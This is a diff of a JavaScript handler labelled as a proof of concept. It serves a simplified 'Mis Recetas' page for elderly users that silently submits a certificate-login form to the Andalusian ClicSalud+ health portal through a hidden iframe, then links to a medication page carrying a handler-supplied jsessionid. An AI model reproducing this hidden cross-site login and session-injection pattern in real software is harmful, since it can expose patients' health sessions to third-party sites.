@@ -30,96 +30,85 @@ export async function handlePoc(request, env) {
       ? `https://www.sspa.juntadeandalucia.es/servicioandaluzdesalud/clicsalud/pages/anonimo/historia/medicacion/medicacionActiva.jsf;jsessionid=${jsessionid}?opcionSeleccionada=MUMEDICACION`
       : targetUrl;
 
-    // HTML con Iframe y carga por debajo
-    const pocHtml = `
+    // HTML del puente amigable (Senior Friendly)
+    const seniorHtml = `
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>ClicSalud+ Pro</title>
+    <title>Mis Recetas</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #f8fafc; font-family: -apple-system, sans-serif; }
-        #main-frame { width: 100%; height: 100%; border: none; }
+        body, html { 
+            margin: 0; 
+            padding: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: #f1f5f9; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            color: #1e293b;
+        }
+        .card {
+            background: white;
+            padding: 3rem 2rem;
+            border-radius: 2.5rem;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
+            max-width: 480px;
+            width: 90%;
+            box-sizing: border-box;
+        }
+        h1 { font-size: 2.2rem; margin-bottom: 1.5rem; color: #0f172a; line-height: 1.2; }
+        p { font-size: 1.3rem; line-height: 1.6; color: #475569; margin-bottom: 2.5rem; }
         
-        .status-bar { 
-            position: fixed; 
-            bottom: 0; 
-            left: 0; 
-            right: 0; 
-            background: rgba(15, 23, 42, 0.95); 
-            color: white; 
-            font-size: 10px; 
-            padding: 5px 15px; 
-            padding-bottom: env(safe-area-inset-bottom, 5px);
-            z-index: 100; 
-            display: flex; 
-            justify-content: space-between;
-            backdrop-filter: blur(8px);
-            border-top: 1px solid rgba(255,255,255,0.1);
-        }
-
-        .loading-overlay { 
-            position: fixed; 
-            top: 0; 
-            left: 0; 
-            right: 0; 
-            bottom: 0; 
-            background: #ffffff; 
-            display: flex; 
-            flex-direction: column; 
-            justify-content: center; 
-            align-items: center; 
-            z-index: 50; 
-            transition: opacity 0.5s ease; 
-        }
-
         .spinner { 
-            border: 3px solid #f1f5f9; 
-            border-top: 3px solid #3b82f6; 
+            border: 6px solid #f1f5f9; 
+            border-top: 6px solid #2563eb; 
             border-radius: 50%; 
-            width: 48px; 
-            height: 48px; 
-            animation: spin 0.8s linear infinite; 
-            margin-bottom: 24px; 
+            width: 70px; 
+            height: 70px; 
+            animation: spin 1s linear infinite; 
+            margin: 0 auto 2.5rem; 
         }
-
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        h2 { color: #0f172a; font-size: 1.25rem; margin: 0; font-weight: 700; }
-        p { color: #64748b; font-size: 0.9rem; margin-top: 8px; text-align: center; max-width: 80%; }
-
-        .fallback-btn {
-            margin-top: 25px;
-            background: #3b82f6;
+        .btn {
+            background: #2563eb;
             color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 12px;
-            font-weight: 600;
-            display: none;
             text-decoration: none;
-            font-size: 14px;
-            box-shadow: 0 10px 15px -3px rgba(59, 130, 246, 0.3);
+            padding: 22px 30px;
+            border-radius: 1.2rem;
+            font-size: 1.5rem;
+            font-weight: 800;
+            display: block;
+            box-shadow: 0 10px 20px -5px rgba(37, 99, 235, 0.4);
+            transition: transform 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
+        .btn:active { transform: scale(0.96); }
+
+        #ready-state { display: none; }
     </style>
 </head>
 <body>
-    <div id="loading" class="loading-overlay">
+    <div class="card" id="waiting-state">
         <div class="spinner"></div>
-        <h2 id="status-title">Iniciando sesión segura</h2>
-        <p id="status-desc">Conectando con ClicSalud+...</p>
-        <a href="/" target="_top" id="fallback" class="fallback-btn">Usar modo de redirección directa</a>
+        <h1>Conectando...</h1>
+        <p>Estamos preparando su acceso.<br><b>Si su móvil se lo pide, elija su certificado digital.</b></p>
     </div>
 
-    <div class="status-bar">
-        <span> medicacion.sirul.net </span>
-        <span id="domain-info">Modo Iframe Activo</span>
+    <div class="card" id="ready-state">
+        <h1 style="color: #059669; font-size: 2.5rem;">¡Todo listo!</h1>
+        <p>Ya puede consultar sus recetas de forma segura.</p>
+        <a href="${targetUrl}" class="btn">VER MIS RECETAS</a>
     </div>
 
-    <iframe id="main-frame" name="main-frame" src="about:blank"></iframe>
+    <!-- El "puente" invisible para forzar la sincronización TLS -->
+    <iframe id="bridge" name="bridge" style="display:none;" src="about:blank"></iframe>
 
-    <form id="auth-form" method="POST" action="${actionUrl}" target="main-frame" style="display:none;">
+    <form id="auth-form" method="POST" action="${actionUrl}" target="bridge" style="display:none;">
         <input type="hidden" name="frm-body" value="frm-body">
         <input type="hidden" name="nameUrl" value="${targetUrl}">
         <input type="hidden" name="lnkAfirma" value="Certificado digital o DNIe">
@@ -128,42 +117,36 @@ export async function handlePoc(request, env) {
 
     <script>
         const form = document.getElementById('auth-form');
-        const iframe = document.getElementById('main-frame');
-        const loading = document.getElementById('loading');
-        const statusTitle = document.getElementById('status-title');
-        const statusDesc = document.getElementById('status-desc');
-        const fallback = document.getElementById('fallback');
+        const iframe = document.getElementById('bridge');
+        const waitState = document.getElementById('waiting-state');
+        const readyState = document.getElementById('ready-state');
 
+        // Cuando el iframe termina de cargar (incluso con error 401), la sesión TLS ya existe
         iframe.onload = function() {
             if (iframe.src !== 'about:blank') {
-                statusTitle.innerText = "Sincronizado";
-                statusDesc.innerText = "Acceso establecido con éxito.";
-                setTimeout(() => {
-                    loading.style.opacity = '0';
-                    setTimeout(() => loading.style.display = 'none', 500);
-                }, 800);
+                waitState.style.display = 'none';
+                readyState.style.display = 'block';
             }
         };
 
-        // Tiempo de espera para detectar bloqueo de cookies de terceros
-        setTimeout(() => {
-            if (loading.style.display !== 'none') {
-                statusTitle.innerText = "Aviso del Sistema";
-                statusDesc.innerHTML = "Es posible que tu navegador esté bloqueando el inicio de sesión dentro de este marco.<br><br>Si no carga, pulsa aquí:";
-                fallback.style.display = 'inline-block';
-            }
-        }, 6000);
-
-        // Envío del formulario
+        // Activamos el "gancho" del certificado nada más entrar
         setTimeout(() => {
             form.submit();
-        }, 200);
+        }, 300);
+
+        // Fallback: si pasan 8 segundos mostramos el botón igualmente por si acaso
+        setTimeout(() => {
+            if (readyState.style.display === 'none') {
+                waitState.style.display = 'none';
+                readyState.style.display = 'block';
+            }
+        }, 8500);
     </script>
 </body>
 </html>
     `;
 
-    return new Response(pocHtml, {
+    return new Response(seniorHtml, {
       headers: {
         'Content-Type': 'text/html; charset=utf-8',
         'Cache-Control': 'no-store, no-cache, must-revalidate'
@@ -173,4 +156,5 @@ export async function handlePoc(request, env) {
     return new Response('Error en POC: ' + err.message, { status: 500 });
   }
 }
+
 
